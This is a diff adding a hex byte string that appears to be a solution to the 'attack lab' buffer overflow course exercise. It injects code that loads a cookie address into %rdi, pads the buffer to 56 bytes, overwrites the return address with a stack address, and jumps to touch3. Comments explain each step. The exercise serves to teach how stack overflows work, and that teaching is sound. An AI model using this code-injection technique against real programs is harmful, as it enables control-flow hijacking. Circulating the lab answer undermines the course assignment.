@@ -1,0 +1,10 @@
+48 c7 c7 f0 b0 62 55 c3 /* %rsp+0x48(address of the cookie string to %rdi(the first argument to a function is passed in register %rdi) then ret */
+00 00 00 00 00 00 00 00 /* the rest of the padding - 48 bytes. 0x38 bytes = 56 bytes, subtructing 8 bytes that already occupied by the cookie */
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+a8 b0 62 55 00 00 00 00 /* address of %rsp register in little endian (return address) */
+c6 17 40 00 00 00 00 00 /* touch3 address from rtarget dump file */
+34 66 33 66 66 33 64 31
